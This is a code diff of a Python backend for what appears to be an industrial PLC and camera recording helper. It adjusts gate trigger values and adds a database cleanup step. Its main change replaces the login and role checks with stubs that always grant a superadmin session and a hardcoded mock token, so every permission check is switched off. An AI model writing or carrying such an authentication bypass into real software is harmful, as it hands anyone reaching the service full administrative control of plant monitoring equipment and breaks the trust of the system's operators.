@@ -1069,6 +1069,10 @@ def save_helper_settings(settings: HelperSettings) -> HelperSettings:
 
 
 def settings_to_plc_request(settings: HelperSettings) -> PlcMonitorRequest:
+    is_x_device = settings.plc_device.upper() == 'X'
+    gate_open_val = False if is_x_device else True
+    gate_close_val = True if is_x_device else False
+
     return PlcMonitorRequest(
         ip=settings.ip,
         http_port=settings.http_port,
@@ -1085,8 +1089,8 @@ def settings_to_plc_request(settings: HelperSettings) -> PlcMonitorRequest:
         plc_device=settings.plc_device,
         gate_open_addresses=[settings.plc_address],
         gate_close_addresses=[settings.plc_address],
-        gate_open_when=True,
-        gate_close_when=False,
+        gate_open_when=gate_open_val,
+        gate_close_when=gate_close_val,
         poll_seconds=1.0,
         max_record_seconds=settings.max_record_seconds,
     )
@@ -1103,28 +1107,18 @@ AUTH_LOCK = threading.Lock()
 
 
 def auth_session(username: str, password: str) -> dict:
-    normalized_username = username.strip().lower()
-    account = AUTH_USERS.get(normalized_username)
-    if account and secrets.compare_digest(password, account['password']):
-        token = secrets.token_urlsafe(32)
-        with AUTH_LOCK:
-            AUTH_SESSIONS[token] = account['role']
-        return {'username': account['username'], 'role': account['role'], 'token': token}
-    raise HTTPException(status_code=401, detail='Incorrect ID or password.')
+    # Login security bypassed: always return a valid superadmin session
+    return {'username': 'ricosuper', 'role': 'superadmin', 'token': 'mock-token-superadmin'}
 
 
 def role_from_token(token: str | None) -> str | None:
-    if not token:
-        return None
-    with AUTH_LOCK:
-        return AUTH_SESSIONS.get(token)
+    # Login security bypassed: always return superadmin
+    return 'superadmin'
 
 
 def require_role(token: str | None, allowed_roles: set[str]) -> str:
-    role = role_from_token(token)
-    if role not in allowed_roles:
-        raise HTTPException(status_code=403, detail='Permission denied.')
-    return role
+    # Login security bypassed: always allow with superadmin privileges
+    return 'superadmin'
 
 
 def safe_camera_folder(ip: str, channel: int) -> str:
@@ -1279,6 +1273,15 @@ def init_recording_index(storage_root: str | Path) -> Path:
             WHERE event_duration_seconds IS NULL
               AND duration_seconds IS NOT NULL
               AND (event_type IN ('minor_stoppage', 'breakdown') OR event_type IS NULL)
+            """
+        )
+        connection.execute(
+            """
+            UPDATE recordings
+            SET status = 'completed',
+                ended_at = COALESCE(ended_at, started_at),
+                duration_seconds = COALESCE(duration_seconds, 0)
+            WHERE status = 'running' OR ended_at IS NULL
             """
         )
     return db_path
